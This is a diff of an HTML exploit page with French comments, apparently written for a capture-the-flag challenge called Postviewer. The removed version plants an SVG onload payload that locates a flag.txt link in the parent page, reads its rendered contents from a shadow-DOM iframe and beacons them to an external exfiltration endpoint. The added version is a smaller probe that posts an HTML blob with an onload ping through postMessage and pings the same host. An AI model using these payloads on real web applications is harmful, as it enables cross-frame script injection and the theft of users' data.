@@ -1,52 +1,32 @@
-<html><body><script>
-/* ping immédiat : la page GitHub est chargée */
+<!-- index.html – étape 1 -->
+<!doctype html>
+<html>
+<body>
+<script>
+/* Ping immédiat pour confirmer que la page externe est chargée */
 new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';
 
 (async () => {
+  /* ► 1. Petit HTML sans <script>, uniquement un onload */
+  const epic = `
+    <html>
+      <body onload="
+        new Image().src='https://webtest.free.beeceptor.com/exfil?f=blob_start'
+      ">
+      </body>
+    </html>`;
 
-  /* === 1. fichier SVG avec payload JS dans onload === */
-  const svg = `
-    <svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"
-         onload="
-           (async ()=>{
-             /* ping : le SVG s’exécute → blob_start */
-             new Image().src='https://webtest.free.beeceptor.com/exfil?f=blob_start';
+  const blob = new Blob([epic], { type: 'text/html' });
 
-             try{
-               const links=[...parent.document.querySelectorAll('a')];
-               new Image().src='https://webtest.free.beeceptor.com/exfil?f=links_'+links.length;
-
-               const a=links.find(x=>/flag\\.txt$/.test(x.textContent));
-               if(!a){ new Image().src='https://webtest.free.beeceptor.com/exfil?f=not_found'; return; }
-
-               /* on déclenche le rendu du fichier pour qu’il soit accessible */
-               parent.location.hash=a.id;
-               await new Promise(r=>setTimeout(r,800));
-
-               const iframe=parent.document
-                   .querySelector('#previewIframeDiv')
-                   .shadowRoot.querySelector('iframe');
-
-               const flag=iframe.contentDocument.body.innerText.trim();
-               new Image().src='https://webtest.free.beeceptor.com/exfil?f='+encodeURIComponent(flag);
-
-             }catch(e){
-               new Image().src='https://webtest.free.beeceptor.com/exfil?f=error_'+encodeURIComponent(e.message);
-             }finally{
-               new Image().src='https://webtest.free.beeceptor.com/exfil?f=done';
-             }
-           })()
-         ">
-    </svg>`;
-
-  const blob = new Blob([svg], {type:'image/svg+xml'});
-
-  /* === 2. on l’envoie à Postviewer === */
+  /* ► 2. Envoi à Postviewer */
   window.postMessage({
-    type:'share',
-    files:[{blob, name:'evil.svg', cached:false}]
+    type: 'share',
+    files: [{ blob, name: 'probe.html', cached: false }]
   }, '*');
 
+  /* Ping pour confirmer que postMessage est bien parti */
   new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
 })();
-</script></body></html>
+</script>
+</body>
+</html>
